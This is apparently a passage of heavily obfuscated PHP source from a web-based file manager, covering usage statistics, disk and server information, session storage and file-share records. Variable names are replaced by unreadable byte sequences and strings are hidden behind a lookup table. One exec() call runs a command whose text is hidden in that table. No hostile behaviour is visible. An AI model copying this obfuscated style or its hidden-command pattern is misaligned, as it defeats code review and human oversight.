$Â¶¤“Û = $˜¥´ÕŸÂ; $—¶Éîœ = strtotime($ÎŞû´Ôİ[1916]); $¨¢ñ¦ö = array(); while ($Â¶¤“Û <= $—¶Éîœ) { $¨¢ñ¦ö[] = date($ÎŞû´Ôİ[1915], $Â¶¤“Û); $Â¶¤“Û = strtotime($ÎŞû´Ôİ[1918], $Â¶¤“Û); } return $¨¢ñ¦ö; } public function _recordUser($¯¸Ğ§ùî = '') { $Šâ¨ç÷ =& $_SERVER[äô®•½Â]; $‚È¥ì˜Ü = strtotime(date($Šâ¨ç÷[1919], strtotime($¯¸Ğ§ùî))); $ŞÌè›ƒ = strtotime(date($Šâ¨ç÷[1920], strtotime($¯¸Ğ§ùî))); $´û˜å›´ = array($Šâ¨ç÷[234] => array($Šâ¨ç÷[1085], $ŞÌè›ƒ)); $âÁè“ğ = Model($Šâ¨ç÷[610])->where($´û˜å›´)->count($Šâ¨ç÷[1777]); $´û˜å›´[$Šâ¨ç÷[234]] = array($Šâ¨ç÷[419], array($‚È¥ì˜Ü, $ŞÌè›ƒ)); $ïğ°ÊŒ¸ = Model($Šâ¨ç÷[610])->where($´û˜å›´)->count($Šâ¨ç÷[1777]); $´û˜å›´[$Šâ¨ç÷[33]] = $Šâ¨ç÷[1921]; $Ÿ‚ãƒ¥ø = Model($Šâ¨ç÷[1922])->where($´û˜å›´)->count($Šâ¨ç÷[1923]); $ò¤µú†» = array($Šâ¨ç÷[285] => $¯¸Ğ§ùî, $Šâ¨ç÷[831] => (int) $âÁè“ğ, $Šâ¨ç÷[1908] => (int) $ïğ°ÊŒ¸, $Šâ¨ç÷[1909] => (int) $Ÿ‚ãƒ¥ø); return $this->insert($ò¤µú†»); } public function _recordStore($º¾ë÷Şš = '') { $øéÖ¾ÀØ =& $_SERVER[äô®•½Â]; $À¡´ÖÆˆ = strtotime(date($øéÖ¾ÀØ[1920], strtotime($º¾ë÷Şš))); $“üÀÁ™× = array($øéÖ¾ÀØ[234] => array($øéÖ¾ÀØ[1085], $À¡´ÖÆˆ)); $˜ı••ù = Model($øéÖ¾ÀØ[557])->where($“üÀÁ™×)->sum($øéÖ¾ÀØ[79]); $“üÀÁ™×[$øéÖ¾ÀØ[496]] = 0; $Úµ¿º¾Î = Model($øéÖ¾ÀØ[896])->where($“üÀÁ™×)->sum($øéÖ¾ÀØ[79]); $“üÀÁ™×[$øéÖ¾ÀØ[191]] = 1; $½ì¶ğ‰‰ = Model($øéÖ¾ÀØ[896])->where($“üÀÁ™×)->sum($øéÖ¾ÀØ[79]); $“üÀÁ™×[$øéÖ¾ÀØ[191]] = 2; $á‰¶–›ô = Model($øéÖ¾ÀØ[896])->where($“üÀÁ™×)->sum($øéÖ¾ÀØ[79]); $åªşƒöæ = array($øéÖ¾ÀØ[285] => $º¾ë÷Şš, $øéÖ¾ÀØ[829] => (int) $Úµ¿º¾Î, $øéÖ¾ÀØ[1912] => (int) $˜ı••ù, $øéÖ¾ÀØ[1913] => (int) $½ì¶ğ‰‰, $øéÖ¾ÀØ[1914] => (int) $á‰¶–›ô); return $this->insert($åªşƒöæ); } public function trend($àç“µ×…, $§®…Êš) { $³¼‘Ü =& $_SERVER[äô®•½Â]; if (!$this->init($àç“µ×…)) { return !1; } $ÜùÇ‹Š = $this->trendList($àç“µ×…); if ($ÜùÇ‹Š && $§®…Êš != $³¼‘Ü[1749]) { $áÀšÖÛì = $ÜùÇ‹Š[0][$³¼‘Ü[285]]; $ò¶Ù¶ÖÅ = $this->validDate($§®…Êš, $áÀšÖÛì); $ı¾»Å§ = array(); $şõàæß = array_to_keyvalue($ÜùÇ‹Š, $³¼‘Ü[285]); foreach ($ò¶Ù¶ÖÅ as $¤•âµ¶À) { if (isset($şõàæß[$¤•âµ¶À])) { $ˆ©àßÔ¯ = $şõàæß[$¤•âµ¶À]; } else { $ˆ©àßÔ¯ = end($ÜùÇ‹Š); $ˆ©àßÔ¯[$³¼‘Ü[285]] = $¤•âµ¶À; if ($àç“µ×… == $³¼‘Ü[678]) { $ˆ©àßÔ¯[$³¼‘Ü[1908]] = $ˆ©àßÔ¯[$³¼‘Ü[1909]] = 0; } } $ı¾»Å§[] = $ˆ©àßÔ¯; } $ÜùÇ‹Š = $ı¾»Å§; } $¨ÀõË¸í = array($³¼‘Ü[678] => array($³¼‘Ü[831] => LNG($³¼‘Ü[1924]), $³¼‘Ü[1908] => LNG($³¼‘Ü[1925]), $³¼‘Ü[1909] => LNG($³¼‘Ü[1926])), $³¼‘Ü[1910] => array($³¼‘Ü[829] => LNG($³¼‘Ü[1927]), $³¼‘Ü[1912] => LNG($³¼‘Ü[1928]), $³¼‘Ü[1913] => LNG($³¼‘Ü[1929]), $³¼‘Ü[1914] => LNG($³¼‘Ü[1930]))); $ôŒå«‰Š = array($³¼‘Ü[678] => $³¼‘Ü[1931], $³¼‘Ü[1910] => $³¼‘Ü[79]); if (empty($ÜùÇ‹Š)) { $¤•âµ¶À = date($³¼‘Ü[1915], strtotime($³¼‘Ü[1916])); $öéšƒÌ = array($³¼‘Ü[285] => $¤•âµ¶À); foreach ($¨ÀõË¸í[$àç“µ×…] as $ÈµªÜÈ => $•Ê¡È¢Ş) { $öéšƒÌ[$ÈµªÜÈ] = 0; } $ÜùÇ‹Š[] = $öéšƒÌ; } $Ûı¹ÎÂ = array(); foreach ($ÜùÇ‹Š as $•Ê¡È¢Ş) { if ($àç“µ×… == $³¼‘Ü[1910] && $•Ê¡È¢Ş[$³¼‘Ü[1912]] > $•Ê¡È¢Ş[$³¼‘Ü[829]]) { $•Ê¡È¢Ş[$³¼‘Ü[1912]] = $•Ê¡È¢Ş[$³¼‘Ü[829]]; } foreach ($¨ÀõË¸í[$àç“µ×…] as $ÈµªÜÈ => $â§Ûé‰Ë) { $ˆ©àßÔ¯ = array($³¼‘Ü[285] => $•Ê¡È¢Ş[$³¼‘Ü[285]], $³¼‘Ü[1664] => $â§Ûé‰Ë); $ˆ©àßÔ¯[$ôŒå«‰Š[$àç“µ×…]] = isset($•Ê¡È¢Ş[$ÈµªÜÈ]) ? $•Ê¡È¢Ş[$ÈµªÜÈ] : 0; $Ûı¹ÎÂ[] = $ˆ©àßÔ¯; } } return $Ûı¹ÎÂ; } public function validDate($ “óÎã€, $‡Û‘º°) { $‚åúŒ® =& $_SERVER[äô®•½Â]; $ÎˆŞâÅä = date($‚åúŒ®[1915], strtotime($‚åúŒ®[1916])); $¤‡¬ê•ø = array($ÎˆŞâÅä); switch ($ “óÎã€) { case $‚åúŒ®[1756]: $Î°¿³Şº = mktime(0, 0, 0, date($‚åúŒ®[1932]), date($‚åúŒ®[1457]) - date($‚åúŒ®[1546]) + 7 - 7, date($‚åúŒ®[1933])); $ãü³²È– = 0; do { $ûË®½Û” = date($‚åúŒ®[1915], $Î°¿³Şº - 3600 * 24 * 7 * $ãü³²È–); $¤‡¬ê•ø[] = $ûË®½Û”; $ãü³²È–++; } while ($‡Û‘º° < $ûË®½Û”); break; case $‚åúŒ®[1754]: $ãü³²È– = 1; do { $ñ°ª‰­¹ = date($‚åúŒ®[1934], strtotime("\55\x20{$ãü³²È–}\40\x6d\157\156\x74\x68\163")); $¤‡¬ê•ø[] = $ñ°ª‰­¹; $ãü³²È–++; } while ($‡Û‘º° < $ñ°ª‰­¹); break; case $‚åúŒ®[1935]: $±Œ°¨®Á = (int) date($‚åúŒ®[1933], strtotime($‡Û‘º°)); $‚Ô§„´š = (int) date($‚åúŒ®[1933]); if ($±Œ°¨®Á >= $‚Ô§„´š) { break; } for ($±Œ°¨®Á; $±Œ°¨®Á < $‚Ô§„´š; $±Œ°¨®Á++) { $¤‡¬ê•ø[] = $±Œ°¨®Á . $‚åúŒ®[1936]; } break; default: break; } if ($‡Û‘º° > end($¤‡¬ê•ø)) { array_pop($¤‡¬ê•ø); } sort($¤‡¬ê•ø); return $¤‡¬ê•ø; } public function listTable($–Äşö™¿) { $ÊƒÁœÓ = ucfirst($–Äşö™¿); return Model($ÊƒÁœÓ)->listData(); } public function option($Ùå•Ÿ‰) { $Ï—µ„½® = $_SERVER[äô®•½Â][1937] . ucfirst($Ùå•Ÿ‰); return $this->{$Ï—µ„½®}(); } private function optionUser() { $û•›É¨° =& $_SERVER[äô®•½Â]; $ùÂ±ßÚ¤ = Model($û•›É¨°[610])->count($û•›É¨°[1777]); $¾ğÄŒ´« = Model($û•›É¨°[610])->where($û•›É¨°[1938])->count($û•›É¨°[1777]); $ñâ›¥Íé = intval($GLOBALS[$û•›É¨°[6]][$û•›É¨°[435]][$û•›É¨°[1722]]) / 3600; $õ¸íâİŠ = strtotime("\55{$ñâ›¥Íé}\x20\x68\157\165\162\163"); $çôÒ´‡½ = strtotime(date($û•›É¨°[1919])); if ($õ¸íâİŠ < $çôÒ´‡½) { $õ¸íâİŠ = $çôÒ´‡½; } $¶ò¯´—÷ = array($û•›É¨°[1939] => array($û•›É¨°[1086], $õ¸íâİŠ)); $…¤”Ñ˜´ = (int) Model($û•›É¨°[610])->where($¶ò¯´—÷)->count($û•›É¨°[1777]); if (!$…¤”Ñ˜´) { $…¤”Ñ˜´ = 1; } $¶ò¯´—÷ = array($û•›É¨°[1939] => array($û•›É¨°[1086], $çôÒ´‡½)); $»úçÈÚÙ = Model($û•›É¨°[610])->where($¶ò¯´—÷)->count($û•›É¨°[1777]); return array($û•›É¨°[824] => (int) $ùÂ±ßÚ¤, $û•›É¨°[1940] => (int) ($ùÂ±ßÚ¤ - $¾ğÄŒ´«), $û•›É¨°[1941] => (int) $¾ğÄŒ´«, $û•›É¨°[1942] => (int) $»úçÈÚÙ, $û•›É¨°[1943] => $…¤”Ñ˜´); } private function optionFile() { $ùÂõò£© =& $_SERVER[äô®•½Â]; $õ±‘ÜÆ° = $this->sourceSize(); $š ˜¾½ñ = $õ±‘ÜÆ°[$ùÂõò£©[79]]; $ÇñÙ = $õ±‘ÜÆ°[$ùÂõò£©[1912]]; $–Ò™û™À = Model($ùÂõò£©[896])->where(array($ùÂõò£©[496] => 0))->count($ùÂõò£©[194]); $¤ŸùŒ¡Ï = array($ùÂõò£©[496] => 0, $ùÂõò£©[234] => array($ùÂõò£©[1086], strtotime(date($ùÂõò£©[1919])))); $îÉÏ½Æà = Model($ùÂõò£©[896])->where($¤ŸùŒ¡Ï)->sum($ùÂõò£©[79]); $¶ĞîÑøı = Model($ùÂõò£©[896])->where($¤ŸùŒ¡Ï)->count($ùÂõò£©[194]); return array($ùÂõò£©[829] => $š ˜¾½ñ, $ùÂõò£©[1912] => $ÇñÙ, $ùÂõò£©[1944] => $š ˜¾½ñ - $ÇñÙ, $ùÂõò£©[1945] => (int) $îÉÏ½Æà, $ùÂõò£©[831] => (int) $–Ò™û™À, $ùÂõò£©[1946] => (int) $¶ĞîÑøı); } private function optionAccess() { $ï€©ëéÔ =& $_SERVER[äô®•½Â]; return array($ï€©ëéÔ[824] => $this->typeLogCnt(), $ï€©ëéÔ[110] => $this->typeLogCnt($ï€©ëéÔ[110]), $ï€©ëéÔ[536] => $this->typeLogCnt($ï€©ëéÔ[536]), $ï€©ëéÔ[1225] => $this->typeLogCnt($ï€©ëéÔ[1225]), $ï€©ëéÔ[1947] => $this->typeLogCnt($ï€©ëéÔ[1947]), $ï€©ëéÔ[678] => $this->typeLogCnt($ï€©ëéÔ[12], $ï€©ëéÔ[1923])); } private function typeLogCnt($…Íäà¨¦ = '', $ÈÖ³ÂÍ˜ = "\151\144") { $áúñÆÁ‡ =& $_SERVER[äô®•½Â]; $¤Ì¹½­ù = array($áúñÆÁ‡[110] => array($áúñÆÁ‡[1948], $áúñÆÁ‡[1949]), $áúñÆÁ‡[536] => array($áúñÆÁ‡[1950], $áúñÆÁ‡[1951]), $áúñÆÁ‡[1225] => array($áúñÆÁ‡[1952], $áúñÆÁ‡[1953], $áúñÆÁ‡[1954]), $áúñÆÁ‡[1947] => array($áúñÆÁ‡[1955], $áúñÆÁ‡[1956]), $áúñÆÁ‡[1957] => array($áúñÆÁ‡[1958], $áúñÆÁ‡[1959], $áúñÆÁ‡[1960])); $©…À¢ = strtotime(date($áúñÆÁ‡[1919])); $ÇÍË†‘ó = array($áúñÆÁ‡[234] => array($áúñÆÁ‡[1086], $©…À¢)); if ($…Íäà¨¦) { $ÇÍË†‘ó[$áúñÆÁ‡[33]] = array($áúñÆÁ‡[7], $¤Ì¹½­ù[$…Íäà¨¦]); } $úøŠ¿œ = Model($áúñÆÁ‡[1922])->where($ÇÍË†‘ó)->count($ÈÖ³ÂÍ˜); return (int) $úøŠ¿œ; } private function optionServer() { $Ìã–¥ÊÔ =& $_SERVER[äô®•½Â]; $‰½õ¸¤ú = $this->diskDriver(); $ìÕØî—™ = KodIO::defaultDriver(); $‚ğ›ãò€ = array($Ìã–¥ÊÔ[889] => $ìÕØî—™[$Ìã–¥ÊÔ[486]]); $ºüºùŒ€ = Model($Ìã–¥ÊÔ[557])->where($‚ğ›ãò€)->sum($Ìã–¥ÊÔ[79]); $ÉÃÉÔŸ¬ = explode($Ìã–¥ÊÔ[53], $_SERVER[$Ìã–¥ÊÔ[147]]); $š–Ç—³¯ = $ÉÃÉÔŸ¬[0]; $—¡“¡î = $GLOBALS[$Ìã–¥ÊÔ[6]][$Ìã–¥ÊÔ[21]]; $ıû‚æ‘× = $—¡“¡î[$Ìã–¥ÊÔ[1048]]; if ($ıû‚æ‘× == $Ìã–¥ÊÔ[1036]) { $ôÔ£êşœ = explode($Ìã–¥ÊÔ[1366], $—¡“¡î[$Ìã–¥ÊÔ[1047]]); $ıû‚æ‘× = $ôÔ£êşœ[0]; } if ($ıû‚æ‘× == $Ìã–¥ÊÔ[984] || $ıû‚æ‘× == $Ìã–¥ÊÔ[874]) { $˜Î›´Â¸ = Model()->db()->query($Ìã–¥ÊÔ[1961]); $õÙ»®ı’ = $˜Î›´Â¸[0] && isset($˜Î›´Â¸[0][$Ìã–¥ÊÔ[1663]]) ? $˜Î›´Â¸[0][$Ìã–¥ÊÔ[1663]] : 0; $ıû‚æ‘× = $Ìã–¥ÊÔ[1962] . ($õÙ»®ı’ ? $Ìã–¥ÊÔ[8] . $õÙ»®ı’ : $Ìã–¥ÊÔ[12]); } $¹¾…è‰û = $GLOBALS[$Ìã–¥ÊÔ[6]][$Ìã–¥ÊÔ[435]][$Ìã–¥ÊÔ[898]]; return array($Ìã–¥ÊÔ[1963] => $‰½õ¸¤ú ? $‰½õ¸¤ú[$Ìã–¥ÊÔ[1964]] : 0, $Ìã–¥ÊÔ[1965] => $‰½õ¸¤ú ? $‰½õ¸¤ú[$Ìã–¥ÊÔ[1966]] : 0, $Ìã–¥ÊÔ[1967] => (int) $ìÕØî—™[$Ìã–¥ÊÔ[1964]] * 1024 * 1024 * 1024, $Ìã–¥ÊÔ[1968] => (int) $ºüºùŒ€, $Ìã–¥ÊÔ[1969] => ucfirst($š–Ç—³¯), $Ìã–¥ÊÔ[1970] => $Ìã–¥ÊÔ[1971] . PHP_VERSION, $Ìã–¥ÊÔ[1972] => phpBuild64() ? 64 : 32, $Ìã–¥ÊÔ[823] => str_replace($Ìã–¥ÊÔ[1204], $Ìã–¥ÊÔ[1064], $ıû‚æ‘×), $Ìã–¥ÊÔ[435] => ucfirst($¹¾…è‰û), $Ìã–¥ÊÔ[32] => $_SERVER[$Ìã–¥ÊÔ[1973]]); } private function diskDriver() { $ÌÖ˜«ä =& $_SERVER[äô®•½Â]; $¿„æ’æ = $ÌÖ˜«ä[8]; $Ï­åèŞ = $GLOBALS[$ÌÖ˜«ä[6]][$ÌÖ˜«ä[1390]] == $ÌÖ˜«ä[1391]; if ($Ï­åèŞ) { $¿„æ’æ = $ÌÖ˜«ä[1974]; if (function_exists($ÌÖ˜«ä[1975])) { exec($ÌÖ˜«ä[1976], $Á‰«¶ñ¹); $¿„æ’æ = $Á‰«¶ñ¹[1] . $ÌÖ˜«ä[8]; } } if (!file_exists($¿„æ’æ)) { return; } if (!function_exists($ÌÖ˜«ä[1977])) { return; } $Í€ë‘âÇ = @disk_total_space($¿„æ’æ); $®…â•·Ñ = $Í€ë‘âÇ - @disk_free_space($¿„æ’æ); return array($ÌÖ˜«ä[1964] => $Í€ë‘âÇ, $ÌÖ˜«ä[1966] => $®…â•·Ñ); } public function fileChart($Å¯Œ„Âè) { $¡†Î¹ª =& $_SERVER[äô®•½Â]; if (isset($Å¯Œ„Âè[$¡†Î¹ª[1777]])) { return Model($¡†Î¹ª[896])->userFileTypeProfile($Å¯Œ„Âè[$¡†Î¹ª[1777]]); } if (isset($Å¯Œ„Âè[$¡†Î¹ª[1388]])) { return Model($¡†Î¹ª[896])->groupFileTypeProfile($Å¯Œ„Âè[$¡†Î¹ª[1388]]); } $¶•òÔù = $this->sourceSize(); $ñ¾ºÇù§ = array($¡†Î¹ª[193] => 0, $¡†Î¹ª[191] => 1); $ÍßÔ¼˜» = Model($¡†Î¹ª[896])->where($ñ¾ºÇù§)->sum($¡†Î¹ª[79]); $ñ¾ºÇù§[$¡†Î¹ª[191]] = 2; $”¹ÍûÆ = Model($¡†Î¹ª[896])->where($ñ¾ºÇù§)->sum($¡†Î¹ª[79]); return array($¡†Î¹ª[829] => $¶•òÔù[$¡†Î¹ª[79]], $¡†Î¹ª[1912] => $¶•òÔù[$¡†Î¹ª[1912]], $¡†Î¹ª[1913] => (int) $ÍßÔ¼˜», $¡†Î¹ª[1914] => (int) $”¹ÍûÆ); } private function sourceSize() { $½Î¯çÃ• =& $_SERVER[äô®•½Â]; $Áıü·â¹ = Model($½Î¯çÃ•[896])->where(array($½Î¯çÃ•[496] => 0))->sum($½Î¯çÃ•[79]); $ç¹ÌÚõğ = Model($½Î¯çÃ•[557])->sum($½Î¯çÃ•[79]); if ($ç¹ÌÚõğ > $Áıü·â¹) { $ç¹ÌÚõğ = $Áıü·â¹; } return array($½Î¯çÃ•[79] => (int) $Áıü·â¹, $½Î¯çÃ•[1912] => (int) $ç¹ÌÚõğ); } } goto cìØ£‘œŒ‘; AçËøêåº: class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\164\x65\155\137\x73\145\163\163\151\157\x6e"; public function get($ä¹ò‚‚) { $Ëù–îÛ± =& $_SERVER[äô®•½Â]; $¹şÕ‚•˜ = $this->where(array($Ëù–îÛ±[2116] => $ä¹ò‚‚))->find(); if (!is_array($¹şÕ‚•˜)) { return !1; } return $¹şÕ‚•˜[$Ëù–îÛ±[171]]; } public function set($î”Ç¢ô, $ÖÄüìØ—, $íîşü½Ÿ = 3600) { $Şáµ€ŞĞ =& $_SERVER[äô®•½Â]; $ÑÒø˜ÃÍ = array($Şáµ€ŞĞ[2116] => $î”Ç¢ô, $Şáµ€ŞĞ[2016] => $ÖÄüìØ—, $Şáµ€ŞĞ[2117] => $íîşü½Ÿ + time()); if (Session::get($Şáµ€ŞĞ[2118])) { $ÑÒø˜ÃÍ[$Şáµ€ŞĞ[1777]] = Session::get($Şáµ€ŞĞ[2118]); } else { $ÑÒø˜ÃÍ[$Şáµ€ŞĞ[1777]] = 0; } if ($this->get($î”Ç¢ô)) { return $this->where(array($Şáµ€ŞĞ[2116] => $î”Ç¢ô))->save($ÑÒø˜ÃÍ); } else { return $this->add($ÑÒø˜ÃÍ, array(), !0); } } public function remove($ó½Š‡Ç) { return $this->where(array($_SERVER[äô®•½Â][2116] => $ó½Š‡Ç))->delete(); } public function clearTimeout() { return $this->where($_SERVER[äô®•½Â][2119] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\x72\x65"; protected $dataAuto = array(array("\155\x6f\144\151\146\x79\x54\x69\x6d\x65", "\164\x69\155\x65", "\151\156\x73\145\x72\164\x2c\165\x70\144\141\164\145", "\x66\165\156\143\164\151\157\156"), array("\143\162\x65\x61\x74\x65\x54\x69\x6d\x65", "\x74\x69\155\x65", "\x69\156\163\145\162\x74", "\x66\x75\x6e\143\x74\x69\x6f\156"), array("\157\x70\164\151\157\156\163", '', "\151\x6e\x73\x65\162\x74\54\165\x70\x64\x61\x74\x65\54\x73\x65\154\145\143\164", "\x6a\x73\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($¡Æ¯ñ«À) { $öâµ˜™Ì =& $_SERVER[äô®•½Â]; $å¸àûÚÒ = isset($¡Æ¯ñ«À[0]) ? $¡Æ¯ñ«À[0] : !1; $Í×™ÔÃ = $öâµ˜™Ì[2120] . USER_ID; return array($öâµ˜™Ì[2121] => array(USER_ID, $öâµ˜™Ì[2122]), $öâµ˜™Ì[2061] => array($å¸àûÚÒ, $öâµ˜™Ì[2123], $Í×™ÔÃ)); } protected function listSimple() { $˜º¾¥ì = array($_SERVER[äô®•½Â][1777] => USER_ID); $ì®Í­Õä = $this->field($this->fieldList)->where($˜º¾¥ì)->select(); return $ì®Í­Õä ? $ì®Í­Õä : array(); } protected function getInfo($×Á®Ë³, $“¼äÍşÍ = false, $§Ú¥ê­´ = '') { $£’¤ƒÓ¨ =& $_SERVER[äô®•½Â]; if (!$§Ú¥ê­´) { $§Ú¥ê­´ = $£’¤ƒÓ¨[2120] . USER_ID; } if ($“¼äÍşÍ) { return $this->_getShareInfo(array($£’¤ƒÓ¨[681] => $×Á®Ë³)); } $¹Ú®İşî = $this->cacheFunctionGet($£’¤ƒÓ¨[2063], $×Á®Ë³, $§Ú¥ê­´); $°ËÂƒæà = $this->shareInfoMofify($¹Ú®İşî, $£’¤ƒÓ¨[226]); if (isset($¹Ú®İşî[$£’¤ƒÓ¨[88]]) && $°ËÂƒæà != $¹Ú®İşî[$£’¤ƒÓ¨[88]]) { $ãöáøÌ = $this->cacheKeyMake($£’¤ƒÓ¨[2063], $×Á®Ë³, $§Ú¥ê­´); $¹Ú®İşî = $this->_getShareInfo(array($£’¤ƒÓ¨[681] => $×Á®Ë³)); Cache::set($ãöáøÌ, $¹Ú®İşî); } return $¹Ú®İşî; } private function shareInfoMofify(&$ïÒÛÖšû, $ÌÈ“’¶’ = "\x67\x65\164") { $è‹­îğ =& $_SERVER[äô®•½Â]; if (!$ïÒÛÖšû || !isset($ïÒÛÖšû[$è‹­îğ[681]])) { return; } $ìûñ‚Ñº = $è‹­îğ[2124] . $ïÒÛÖšû[$è‹­îğ[681]]; if ($ÌÈ“’¶’ == $è‹­îğ[226]) { return Cache::get($ìûñ‚Ñº); } else { if ($ÌÈ“’¶’ == $è‹­îğ[2092]) { $ŒîÍ½û = Cache::get($ìûñ‚Ñº); if ($ŒîÍ½û === $ïÒÛÖšû[$è‹­îğ[88]]) { return; } $ïÒÛÖšû[$è‹­îğ[2125]] = USER_ID . $è‹­îğ[473] . $ïÒÛÖšû[$è‹­îğ[88]]; Cache::set($ìûñ‚Ñº, $ïÒÛÖšû[$è‹­îğ[88]]); } else { if ($ÌÈ“’¶’ == $è‹­îğ[2126]) { Cache::remove($ìûñ‚Ñº); } } } } public function getInfoByHash($ñœÑúÚ¸) { return $this->_getShareInfo(array($_SERVER[äô®•½Â][2127] => $ñœÑúÚ¸)); } public function getInfoByPath($ÎÇš„Ö) { $¼åáˆÏ¬ =& $_SERVER[äô®•½Â]; $ÕÜñ™İœ = array($¼åáˆÏ¬[1777] => USER_ID, $¼åáˆÏ¬[194] => $ÎÇš„Ö); return $this->_getShareInfo($ÕÜñ™İœ); } public function getInfoBySourcePath($‡«Íñ©À) { $¸’¤¯„ =& $_SERVER[äô®•½Â]; $öˆäÑ = array($¸’¤¯„[1777] => USER_ID, $¸’¤¯„[1255] => $‡«Íñ©À); return $this->_getShareInfo($öˆäÑ); } private function _getShareInfo($×—² Ì) { $–¼Ş³à» =& $_SERVER[äô®•½Â]; $¦ØğãÇ„ = $this->where($×—² Ì)->find(); if (!$¦ØğãÇ„) { return !1; } $×—² Ì = array($–¼Ş³à»[681] => $¦ØğãÇ„[$–¼Ş³à»[681]]); $ÅĞ“–åÑ = $–¼Ş³à»[2128]; $‹Ä†¬…„ = Model($–¼Ş³à»[682])->order($–¼Ş³à»[486])->field($ÅĞ“–åÑ)->where($×—² Ì)->select(); if ($¦ØğãÇ„[$–¼Ş³à»[194]] == $–¼Ş³à»[231]) { $¦ØğãÇ„[$–¼Ş³à»[90]] = IO::info($¦ØğãÇ„[$–¼Ş³à»[1255]]); } else { $¦ØğãÇ„[$–¼Ş³à»[90]] = Model($–¼Ş³à»[1426])->pathInfo($¦ØğãÇ„[$–¼Ş³à»[194]]); } $¦ØğãÇ„[$–¼Ş³à»[2129]] = $‹Ä†¬…„; $this->shareInfoMofify($¦ØğãÇ„, $–¼Ş³à»[2092]); return $¦ØğãÇ„; } protected function getInfoAuth($Š¼Æ‚Ÿ¿) { $—ÃÓˆÈİ =& $_SERVER[äô®•½Â]; $²Ì‘¥ïÙ = $this->getInfo($Š¼Æ‚Ÿ¿); if ($²Ì‘¥ïÙ[$—ÃÓˆÈİ[1777]] == USER_ID) { $²Ì‘¥ïÙ[$—ÃÓˆÈİ[498]] = $²Ì‘¥ïÙ[$—ÃÓˆÈİ[90]][$—ÃÓˆÈİ[498]]; } else { $²Ì‘¥ïÙ[$—ÃÓˆÈİ[498]] = Model($—ÃÓˆÈİ[580])->authMake($²Ì‘¥ïÙ[$—ÃÓˆÈİ[2129]]); } return $²Ì‘¥ïÙ; } protected function listData($ö°üÙ¼¿ = null, $–Ò¦²ç’ = 300) { $¶ìñ©ƒé =& $_SERVER[äô®•½Â]; $ó§Õªù = array(array($¶ìñ©ƒé[575] => array($¶ìñ©ƒé[1084], 0), $¶ìñ©ƒé[679] => array($¶ìñ©ƒé[1084], 0), $¶ìñ©ƒé[2130] => $¶ìñ©ƒé[2080])); if ($ö°üÙ¼¿ == $¶ìñ©ƒé[2131]) { $ó§Õªù = array($¶ìñ©ƒé[575] => 1); } else { if ($ö°üÙ¼¿ == $¶ìñ©ƒé[1238]) { $ó§Õªù = array($¶ìñ©ƒé[679] => 1); } } $ó§Õªù[$¶ìñ©ƒé[1777]] = USER_ID; $ÃêåŒÌ = $this->where($ó§Õªù)->selectPage($–Ò¦²ç’); return $ÃêåŒÌ; } protected function listToMe($êãôõ¸ = 300) { $šõ³‹·¦ =& $_SERVER[äô®•½Â]; $Áª–ÊÏ¢ = Model($šõ³‹·¦[2132])->userGroupParents(USER_ID); $²ÉØòá¥ = array($šõ³‹·¦[664] => SourceModel::TYPE_USER, $šõ³‹·¦[582] => USER_ID); if ($Áª–ÊÏ¢) { $²ÉØòá¥ = array(array($šõ³‹·¦[664] => SourceModel::TYPE_USER, $šõ³‹·¦[582] => USER_ID), array($šõ³‹·¦[664] => SourceModel::TYPE_GROUP, $šõ³‹·¦[582] => array($šõ³‹·¦[7], $Áª–ÊÏ¢)), $šõ³‹·¦[2130] => $šõ³‹·¦[2080]); } $†ÙÄª”Å = Model($šõ³‹·¦[682])->where($²ÉØòá¥)->selectPage($êãôõ¸); $«ï¡ÒÉæ = array_to_keyvalue_group($†ÙÄª”Å[$šõ³‹·¦[456]], $šõ³‹·¦[681]); if (!$«ï¡ÒÉæ) { return $†ÙÄª”Å; } $†“ê»é‡ = $šõ³‹·¦[2133]; $²ÉØòá¥ = array($šõ³‹·¦[681] => array($šõ³‹·¦[503], array_keys($«ï¡ÒÉæ)), $šõ³‹·¦[1777] => array($šõ³‹·¦[1086], $šõ³‹·¦[231])); $îÀıÎ–Ú = $this->field($†“ê»é‡)->where($²ÉØòá¥)->select(); foreach ($îÀıÎ–Ú as $Œäª ¥Ã => &$ü§ßöä) { $ü§ßöä[$šõ³‹·¦[2129]] = $«ï¡ÒÉæ[$ü§ßöä[$šõ³‹·¦[681]]]; } unset($ü§ßöä); $®ºíê© = array($šõ³‹·¦[2134] => $îÀıÎ–Ú, $šõ³‹·¦[2135] => $†ÙÄª”Å[$šõ³‹·¦[453]]); return $®ºíê©; } protected function shareAdd($ÌÊ‹Å‚Ä, $ı„ëä„ã) { $¥¾óšè¬ =& $_SERVER[äô®•½Â]; $ ª·±ç = $this->_addShareData($ÌÊ‹Å‚Ä, $ı„ëä„ã); if (!empty($ı„ëä„ã[$¥¾óšè¬[2136]])) { $this->_shareAuthSet($ ª·±ç, $ı„ëä„ã[$¥¾óšè¬[2136]]); } $this->shareEventAdd($ÌÊ‹Å‚Ä, $ı„ëä„ã, $¥¾óšè¬[2137]); return $ ª·±ç; } protected function shareAddSystem($À¶ñ™˜, $ÔºŸ½Ÿ…) { $ÆÁ¦§±˜ =& $_SERVER[äô®•½Â]; $Ï™¬êşª = $this->_addShareData($À¶ñ™˜, $ÔºŸ½Ÿ…, $ÆÁ¦§±˜[192]); $this->_shareAuthSet($Ï™¬êşª, $ÔºŸ½Ÿ…[$ÆÁ¦§±˜[2136]]); return $Ï™¬êşª; } private function shareEventAdd($²€ØËş, $ìâ®íãÉ, $Îª‚ßÄ± = "\x61\x64\144") { $§éúË±» =& $_SERVER[äô®•½Â]; if (!$²€ØËş || $²€ØËş == $§éúË±»[231]) { return; } if ($Îª‚ßÄ± == $§éúË±»[2137]) { if ($ìâ®íãÉ[$§éúË±»[575]] == $§éúË±»[91]) { Model($§éúË±»[649])->eventShare($²€ØËş, $§éúË±»[2138]); } if ($ìâ®íãÉ[$§éúË±»[679]] == $§éúË±»[91]) { Model($§éúË±»[649])->eventShare($²€ØËş, $§éúË±»[2139]); } return; } $òÊŸ÷ëİ = $this->getInfoByPath($²€ØËş); $ÒäÈæí” = $§éúË±»[2140]; if ($òÊŸ÷ëİ[$§éúË±»[575]] == $§éúË±»[231] && $ìâ®íãÉ[$§éúË±»[575]] == $§éúË±»[91]) { $ÒäÈæí” = $§éúË±»[2138]; } if ($òÊŸ÷ëİ[$§éúË±»[575]] == $§éúË±»[91] && $ìâ®íãÉ[$§éúË±»[575]] == $§éúË±»[231]) { $ÒäÈæí” = $§éúË±»[2141]; } 